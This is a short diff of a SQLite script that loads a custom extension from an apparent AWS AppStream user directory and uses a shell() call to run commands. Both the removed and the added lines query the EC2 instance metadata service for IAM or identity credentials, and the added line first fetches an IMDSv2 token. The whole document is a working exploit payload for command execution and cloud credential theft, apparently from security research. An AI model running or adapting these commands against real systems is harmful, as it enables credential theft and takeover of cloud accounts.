@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("/usr/bin/dcv list-connections; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/; ");
+select shell("echo start; export TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token); curl http://169.254.169.254/latest/meta-data/identity-credentials/ -H 'X-aws-ec2-metadata-token: $TOKEN'; echo end;");
 -- </html>
